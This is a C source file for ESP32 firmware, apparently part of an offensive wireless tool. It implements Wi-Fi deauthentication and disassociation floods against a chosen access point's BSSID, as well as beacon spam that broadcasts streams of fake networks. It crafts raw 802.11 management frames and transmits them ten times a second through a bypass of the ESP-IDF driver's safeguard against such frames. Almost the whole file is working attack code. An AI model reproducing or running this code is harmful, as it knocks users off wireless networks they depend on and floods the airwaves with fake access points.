#include "svc_deauth.h"
#include "svc_target.h"
#include "svc_wifi.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_random.h"
#include <string.h>

static const char *TAG = "svc_deauth";

static esp_timer_handle_t s_timer = NULL;
static uint8_t s_bssid[6];        /* target BSSID (deauth/disassoc) */
static uint8_t s_beacon_bssid[6]; /* per-frame random BSSID (beacon spam) */
static int s_channel = 1;         /* pinned channel, clamped 1..13 */
static volatile uint32_t s_frames = 0;
static volatile int s_tx_err = 0;      /* first TX error since start */
static volatile int s_tx_errcode = 0;
static volatile uint32_t s_ticks = 0; /* TX callback invocations */
static volatile int s_last_err = 0;
static volatile int s_beacon_ok = 0;  /* driver accepts beacon frames? */
static int64_t s_started_us = 0;      /* run start, for timeout + elapsed */
static volatile int s_expired = 0;     /* timeout reached; owner must stop */
static volatile uint32_t s_fps = 0;   /* smoothed frames/second */
static uint32_t s_win_frames = 0;     /* fps window bookkeeping */
static int64_t s_win_us = 0;
static deauth_mode_t s_mode = DEAUTH_MODE_DEAUTH;

#define DEAUTH_PERIOD_US 100000 /* Hydra-ESP broadcast cadence */

/* Raw management templates, matching Hydra-ESP's wsl_bypasser frames:
 *   deauth     FC c0, reason 0x0002 (prev auth not valid)
 *   disassoc   FC a0, reason 0x0001 (unspecified)
 * dst broadcast, addr2/addr3 patched with the BSSID, seq f0 ff. */
static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
    static const uint8_t tpl[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00,
    };
    memcpy(f, tpl, sizeof(tpl));
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
}

static void build_disassoc(uint8_t *f, const uint8_t bssid[6]) {
    static const uint8_t tpl[26] = {
        0xa0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x01, 0x00,
    };
    memcpy(f, tpl, sizeof(tpl));
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
}

/* Beacon spam: FC 0x80 with a randomized source BSSID and a random
 * printable SSID (1..10 chars) every tick, so nearby scanners see a
 * stream of fake APs. Length is returned for the caller to TX. */
static int build_beacon(uint8_t *f, uint8_t bssid[6], int channel) {
    static const char alphabet[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const size_t alen = sizeof(alphabet) - 1;
    int ssid_len = 1 + (int)(esp_random() % 10); /* 1..10 */
    for (int i = 0; i < 6; i++)
        bssid[i] = (uint8_t)esp_random();
    f[0] = 0x80;                     /* mgmt / beacon */
    f[1] = 0x00;
    f[2] = 0x00;
    f[3] = 0x00;
    memset(f + 4, 0xff, 6);          /* addr1: broadcast */
    memcpy(f + 10, bssid, 6);        /* addr2: source = random BSSID */
    memcpy(f + 16, bssid, 6);        /* addr3: BSSID */
    f[22] = 0x00;                    /* sequence control */
    f[23] = 0x00;
    uint32_t ts = (uint32_t)esp_random();
    f[24] = (uint8_t)(ts & 0xff);
    f[25] = (uint8_t)((ts >> 8) & 0xff);
    f[26] = (uint8_t)((ts >> 16) & 0xff);
    f[27] = (uint8_t)((ts >> 24) & 0xff);
    f[28] = 0x00;
    f[29] = 0x00;
    f[30] = 0x00;
    f[31] = 0x00;
    f[32] = 0x64;                    /* beacon interval 100 TU */
    f[33] = 0x00;
    f[34] = 0x11;                    /* capability info: ESS + privacy */
    f[35] = 0x04;
    f[36] = 0x00;                    /* SSID tag */
    f[37] = (uint8_t)ssid_len;
    for (int i = 0; i < ssid_len; i++)
        f[38 + i] = (uint8_t)alphabet[esp_random() % alen];
    int o = 38 + ssid_len;
    f[o++] = 0x03;                   /* DS parameter set */
    f[o++] = 0x01;
    f[o++] = (uint8_t)channel;
    return o;
}

static void tx_tick(void *arg) {
    (void)arg;
    s_ticks++;                       /* proof the callback fires at all */
    /* TX goes through the WSL bypass so the driver's frame-type gate
     * accepts management subtypes (see wsl_bypasser.h). */
    uint8_t f[64];
    int ok_count = 0;
    esp_err_t err = ESP_OK;
    int passes = (s_mode == DEAUTH_MODE_COMBINED) ? 2 : 1;
    for (int i = 0; i < passes; i++) {
        int len = sizeof(f);
        if (s_mode == DEAUTH_MODE_BEACON) {
            len = build_beacon(f, s_beacon_bssid, s_channel);
        } else {
            build_deauth(f, s_bssid);
            if (s_mode == DEAUTH_MODE_DISASSOC) {
                build_disassoc(f, s_bssid);
            }
            len = 26;
        }
        err = wsl_send_raw(f, len);
        s_last_err = (int)err;
        if (err == ESP_OK)
            ok_count++;
    }
    s_frames += (uint32_t)ok_count;
    if (err != ESP_OK && !s_tx_err) {
        s_tx_err = 1;
        s_tx_errcode = (int)err;
    }

    /* Frame rate over a ~1 s window. */
    int64_t now = esp_timer_get_time();
    if (s_win_us == 0) {
        s_win_us = now;
        s_win_frames = s_frames;
    }
    int64_t d = now - s_win_us;
    if (d >= 1000000) {
        s_fps = (uint32_t)(((uint64_t)(s_frames - s_win_frames) * 1000000ULL) /
                           (uint64_t)d);
        s_win_us = now;
        s_win_frames = s_frames;
    }

    /* Auto-stop flag. The timer cannot delete itself from its own
     * callback, so only raise the flag; the owner stops the attack. */
    if (!s_expired &&
        (uint64_t)(now - s_started_us) >= (uint64_t)DEAUTH_TIMEOUT_S * 1000000ULL)
        s_expired = 1;
}

/* Probe: send one frame and report what the driver says. TX goes through
 * the WSL bypass (wsl_bypasser.h), which overrides the driver's frame-type
 * gate; without it esp_wifi_80211_tx() returns ESP_ERR_INVALID_ARG for
 * management subtypes like deauth on a stock ESP-IDF. */
static esp_err_t probe_subtype(uint8_t fc0) {
    uint8_t f[26];
    build_deauth(f, s_bssid);
    f[0] = fc0;
    return wsl_send_raw(f, (int)sizeof(f));
}

static esp_err_t probe_tx(void) {
    return probe_subtype(0xc0); /* deauth */
}

int svc_deauth_start(deauth_mode_t mode) {
    if (s_timer)
        return 0;
    if (mode >= DEAUTH_MODE_COUNT)
        return -1;
    /* Beacon spam invents its own BSSIDs, so it needs no session target;
     * the deauth family requires one. */
    if (mode != DEAUTH_MODE_BEACON && !tgt_wifi_has())
        return -1;
    s_mode = mode;
    memcpy(s_bssid, tgt_wifi_bssid(), 6);
    if (svc_wifi_init() != 0)
        return -2;
    esp_wifi_set_ps(WIFI_PS_NONE);
    int ch = tgt_wifi_channel();
    if (ch < 1)
        ch = 1;
    if (ch > 13)
        ch = 13;
    s_channel = ch;
    if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
        return -3;
    esp_err_t perr = probe_tx();
    s_beacon_ok = probe_subtype(0x80) == ESP_OK;
    if (perr != ESP_OK) {
        s_tx_errcode = (int)perr;
        return -6;   /* driver refused the frame */
    }
    s_frames = 0;
    s_tx_err = 0;
    s_tx_errcode = 0;
    s_ticks = 0;
    s_last_err = 0;
    s_expired = 0;
    s_fps = 0;
    s_win_frames = 0;
    s_win_us = 0;
    s_started_us = esp_timer_get_time();
    esp_timer_create_args_t a = {
        .callback = tx_tick,
        .name = "deauth",
    };
    if (esp_timer_create(&a, &s_timer) != ESP_OK) {
        s_timer = NULL;
        return -4;
    }
    if (esp_timer_start_periodic(s_timer, DEAUTH_PERIOD_US) != ESP_OK) {
        esp_timer_delete(s_timer);
        s_timer = NULL;
        return -5;
    }
    ESP_LOGI(TAG, "running, mode %s, ch %d",
             svc_deauth_mode_name(s_mode), ch);
    return 0;
}

void svc_deauth_stop(void) {
    if (!s_timer)
        return;
    esp_timer_stop(s_timer);
    esp_timer_delete(s_timer);
    s_timer = NULL;
    ESP_LOGI(TAG, "stopped, %lu frames", (unsigned long)s_frames);
}

int svc_deauth_running(void) { return s_timer != NULL; }

uint32_t svc_deauth_frames(void) { return s_frames; }

int svc_deauth_tx_error(void) { return s_tx_errcode; }

uint32_t svc_deauth_ticks(void) { return s_ticks; }

int svc_deauth_beacon_ok(void) { return s_beacon_ok; }

int svc_deauth_expired(void) { return s_expired; }

uint32_t svc_deauth_fps(void) { return s_fps; }

uint32_t svc_deauth_elapsed_s(void) {
    if (!s_timer)
        return 0;
    return (uint32_t)((uint64_t)(esp_timer_get_time() - s_started_us) /
                      1000000ULL);
}

uint32_t svc_deauth_remaining_s(void) {
    if (!s_timer)
        return 0;
    uint32_t e = svc_deauth_elapsed_s();
    return e >= DEAUTH_TIMEOUT_S ? 0 : DEAUTH_TIMEOUT_S - e;
}

deauth_mode_t svc_deauth_mode(void) { return s_mode; }

const char *svc_deauth_mode_name(deauth_mode_t m) {
    switch (m) {
        case DEAUTH_MODE_DEAUTH:   return "Deauth";
        case DEAUTH_MODE_DISASSOC: return "Disassoc";
        case DEAUTH_MODE_COMBINED: return "Deauth+Disassoc";
        case DEAUTH_MODE_BEACON:   return "BeaconSpam";
        default:                   return "?";
    }
}